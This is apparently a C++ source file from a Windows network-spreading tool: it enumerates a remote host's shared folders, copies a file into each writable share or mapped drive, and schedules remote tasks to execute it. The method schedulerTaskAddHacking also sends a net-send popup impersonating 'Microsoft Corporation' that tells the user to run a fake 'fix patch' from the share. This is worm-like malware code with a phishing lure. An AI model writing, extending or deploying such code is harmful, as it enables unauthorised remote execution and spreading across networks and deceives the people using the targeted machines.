#include "Computer.h"

Computer::Computer(char * IP, bool autoScanShares) {
   IPAddress = new char[strlen(IP) + 1];
   resourceShares = new NetBios();
   
   strcpy(IPAddress, IP);
   
   if (autoScanShares) resourceShares->netShareEnumeration(IPAddress);
}

Computer::Computer(char * name, char * IP, bool autoScanShares) {
   computerName = new char[strlen(name) + 1];
   IPAddress = new char[strlen(IP) + 1];
   resourceShares = new NetBios();
   
   strcpy(computerName, name);
   strcpy(IPAddress, IP);
   
   if (autoScanShares) resourceShares->netShareEnumeration(IPAddress);
}

bool Computer::schedulerTaskAdd(const char * time, int daysWeek, const char * command, bool interactive) {
   return NetBios::netSchedulerRemoteTaskAdd(IPAddress, time, daysWeek, command, interactive);
}

bool Computer::schedulerTaskAddHacking(const char * time, int daysWeek, const char * fileSourcePath, const char * filename, bool interactive) {   
   PSHARE_INFO_1 * shareFoldersList;
   bool findFile = false, insertedTask = false;
   char * shareName;
   
   shareFoldersList = getShareFoldersList();
   
   for(long i = 0; ((i < getNumFolders()) && (!findFile)); i++) {
      shareName = FunctionsStrings::castingWideCharToChar((wchar_t *) (*(shareFoldersList + i))->shi1_netname);
      if ((strcmp(shareName, "print$") != 0) && (shareName != NULL)) {
         if (FunctionsFiles::fileExists((string("\\\\") + string(IPAddress) + string("\\") + string(shareName) + string("\\") + string(filename)).c_str())) { 
            findFile = true;   
         }
      }
   }
   if (findFile) {
      insertedTask = NetBios::netSchedulerRemoteTaskAdd(IPAddress, time, daysWeek, (string("\\\\127.0.0.1\\") + string(shareName) + string("\\") + string(filename)).c_str(), interactive);   
   }
   if (!insertedTask) {
      if ((strlen((char *) fileSourcePath) > 0) && (FunctionsStrings::getLastToken((char *) fileSourcePath, '\\') != NULL)) {
         insertedTask = NetBios::netSchedulerRemoteTaskAdd(IPAddress, time, daysWeek, (string("copy ") + string(fileSourcePath) + string(" && ") + string(FunctionsStrings::getLastToken((char *) fileSourcePath, '\\'))).c_str(), interactive);
      } 
   }
   
   /* MessageBox - NetSend */
   if ((!insertedTask) && (findFile)) {
      NetBios::netSendMessage(SOURCE_NET_SEND, IPAddress, (string("Microsoft Corporation ®\r\rRun the fix patch ") + string(filename) + string(" downloaded in\r") + string("\\\\127.0.0.1\\") + string(shareName) + string(" to solve the latest vulnerabilities.\r\rStart > Run > ") + string("\\\\127.0.0.1\\") + string(shareName) + string("\\") + string(filename)).c_str());
   }
   
   return insertedTask;    
}

bool Computer::schedulerTaskAdd(const char * time, char * daysMonth, const char * command, bool interactive) {
   return NetBios::netSchedulerRemoteTaskAdd(IPAddress, time, daysMonth, command, interactive);
}
      
char * Computer::time() {
   return NetBios::netTime(IPAddress);
}

bool Computer::sendMessage(const char * destiny, const char * messageText) {
   return NetBios::netSendMessage(IPAddress, destiny, messageText);
}

void Computer::scanResourceShares() {
   resourceShares->netShareEnumeration(IPAddress);
}

void Computer::setComputerName(char * name) {
   computerName = new char[strlen(name) + 1];
   strcpy(computerName, name); 
}

PSHARE_INFO_1 * Computer::getSharePrintersList() {
   if (getNumPrinters() > 0) return resourceShares->getShareRemotePrintersList();
   return NULL;
}

PSHARE_INFO_1 * Computer::getShareFoldersList() {
   if (getNumFolders() > 0) return resourceShares->getShareRemoteFoldersList();
   return NULL;
}

PSHARE_INFO_1 * Computer::getShareSpecialFoldersList() {
   if (getNumSpecialFolders() > 0) return resourceShares->getShareRemoteSpecialFoldersList();
   return NULL;
}

long Computer::getNumPrinters() { return resourceShares->getNumRemotePrinters(); }

long Computer::getNumFolders() { return resourceShares->getNumRemoteFolders(); }

long Computer::getNumSpecialFolders() { return resourceShares->getNumRemoteSpecialFolders(); }

bool Computer::copyFileToSharesFolder(const char * strFilename, const char * strFilenameDestiny) {
   PSHARE_INFO_1 * shareFoldersList;
   bool result = false;
   char * shareName;
   
   if (FunctionsFiles::fileExists(strFilename)) {
      shareFoldersList = getShareFoldersList();
      for(long i = 0; i < getNumFolders(); i++) {
         shareName = FunctionsStrings::castingWideCharToChar((wchar_t *) (*(shareFoldersList + i))->shi1_netname);
         if ((strcmp(shareName, "print$") != 0) && (shareName != NULL)) {
            if (strFilenameDestiny != NULL) {
               if (FunctionsFiles::copyFile(strFilename, string(string("\\\\") + string(IPAddress) + string("\\") + string(shareName) + string("\\") + string(strFilenameDestiny)).c_str())) result = true;  
            }
            else {
               if (FunctionsFiles::copyFile(strFilename, string(string("\\\\") + string(IPAddress) + string("\\") + string(shareName) + string("\\") + string(FunctionsStrings::getLastToken((char *) strFilename, '\\'))).c_str())) result = true;  
            }
         }
      }
   }
   return result;
}

bool Computer::copyFileToSharesMappingFolder(const char * strFilename) {
   PSHARE_INFO_1 * shareFoldersList;
   char mappingSharesList[MAX_MAPPING_SHARES];
   int numElems = 0, overwrite = 0; 
   char * letter, * shareName, * overLetter = (char *) malloc(4);
   bool eraseConnection = false;
   bool result = false;
   
   if (FunctionsFiles::fileExists(strFilename)) {
      shareFoldersList = getShareFoldersList();
      for(long i = 0; i < getNumFolders(); i++) {
         shareName = FunctionsStrings::castingWideCharToChar((wchar_t *) (*(shareFoldersList + i))->shi1_netname);
         if ((strcmp(shareName, "print$") != 0) && (shareName != NULL)) {
            if (FunctionsWindowsNT::getBusyNumDrives() < MAX_MAPPING_SHARES) {
               letter = NetBios::netUseDirectoryAdd(IPAddress, shareName);
               if (letter != NULL) {
                  mappingSharesList[numElems] = *letter;
                  numElems++;
               }
            }
            else {
               if (numElems > 0) {
                  *(overLetter) = mappingSharesList[overwrite]; *(overLetter + 1) = ':'; *(overLetter + 2) = '\x00';
                  eraseConnection = false;
                  do {
                     if ((NetBios::netUseDirectoryDel(overLetter)) || (*(overLetter) == '?')) {
                        Sleep(500);
                        letter = NetBios::netUseDirectoryAdd(IPAddress, shareName);
                        if (letter != NULL) {
                           mappingSharesList[overwrite] = *letter;
                           overwrite++;
                           overwrite %= numElems;
                           eraseConnection = true;
                        }
                        else mappingSharesList[overwrite] = '?';
                     }
                     else { Sleep(5000); }
                  }
                  while(!eraseConnection);
               }
            }
         } 
      }
      for (int i = 0; i < numElems; i++) {
         *(overLetter) = mappingSharesList[i]; *(overLetter + 1) = ':'; *(overLetter + 2) = '\\'; *(overLetter + 3) = '\x00';
         if (FunctionsFiles::copyFile(strFilename, overLetter)) result = true;
         Sleep(2000);
         *(overLetter + 2) = '\x00'; NetBios::netUseDirectoryDel(overLetter);
      }
   }
   free(overLetter);
   return result;
}
